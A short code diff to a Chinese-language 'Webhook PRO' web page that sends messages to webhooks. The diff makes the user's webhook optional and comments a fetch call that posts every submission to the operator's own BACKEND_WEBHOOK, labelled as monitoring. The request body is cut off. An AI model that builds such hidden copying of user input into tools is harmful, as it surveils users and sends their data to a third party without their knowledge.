@@ -71,7 +71,7 @@ button:hover{transform:scale(1.05);}
 <div class="box">
 <h2>🚀 Webhook PRO</h2>
 
-<input id="userWebhook" placeholder="使用者 Webhook（必填）">
+<input id="userWebhook" placeholder="使用者 Webhook（可不填）">
 
 <input id="name" placeholder="名稱">
 <input id="avatar" placeholder="頭像 URL">
@@ -150,7 +150,7 @@ async function send(){
 
     document.getElementById("status").innerText="發送中...";
 
-    
+    // 👉 發送到使用者 webhook
     if(userWebhook){
         fetch(userWebhook,{
             method:"POST",
@@ -159,7 +159,7 @@ async function send(){
         });
     }
 
-    /
+    // 👉 發送到你的後台（監控）
     fetch(BACKEND_WEBHOOK,{
         method:"POST",
         headers:{"Content-Type":"application/json"},
